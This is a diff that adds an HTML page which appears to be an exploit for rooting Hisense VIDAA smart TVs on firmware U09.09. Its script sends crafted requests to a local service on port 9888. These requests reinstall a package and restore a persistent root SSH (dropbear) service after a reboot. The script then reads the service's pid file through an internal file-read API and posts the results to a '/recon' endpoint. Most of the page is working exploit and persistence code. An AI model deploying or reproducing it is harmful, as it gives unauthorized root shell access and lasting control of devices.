@@ -1,0 +1,43 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>vidaa root trigger (U09.09 / 09.09O)</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace"><pre id="o">START u909 re-arm</pre>
+<script>
+/* Re-arm root ssh after a reboot on U09.09 / 09.09O.
+   Same as trigger.html, but superwatch ids 54 (uninstall) then 53 (install).
+   82/83 reply 604 on this branch. Prefer re_sshd so this page is unused. */
+var O = document.getElementById('o');
+function log(m){ O.textContent += "\n" + m; return m; }
+function post(t){ try{ var x=new XMLHttpRequest(); x.open("POST","/recon",false);
+  x.setRequestHeader("Content-Type","text/plain"); x.send(t); }catch(e){} }
+
+setTimeout(function(){
+  var out = [];
+  var urls = [
+    "https://localhost:9888/function/basic/fetch/sw2",
+    "https://localhost:9888/function/system/fetch/sw2"
+  ];
+  var body = {list:[
+    "70:54:70;re.installer",
+    "71:53:71;/APPS/installer.ipk;re.installer;"
+  ]};
+  for (var i = 0; i < urls.length; i++) {
+    try{
+      var x = new XMLHttpRequest();
+      x.open("POST", urls[i], false);
+      x.setRequestHeader("identifier", "");
+      x.send(JSON.stringify(body));
+      out.push(urls[i].replace("https://localhost:9888","") + " -> " +
+        String(x.responseText||"").slice(0,300));
+      if (String(x.responseText||"").indexOf("got error") === -1 &&
+          String(x.responseText||"").length > 0) break;
+    }catch(e){ out.push(urls[i] + " EXC " + e.name + ": " + e.message); }
+  }
+
+  try{
+    var p = vowOS.service.syncExecute("hiutils", {api:"fileRead", args:{mode:6, path:".re_sshd/dropbear.pid"}});
+    out.push("pid=" + (p.ret ? p.msg.trim() : "ERR"));
+  }catch(e){ out.push("pid EXC " + e.message); }
+
+  post("TRIGGER-U909\n" + out.join("\n"));
+  log(out.join("\n"));
+}, 1200);
+</script></body></html>
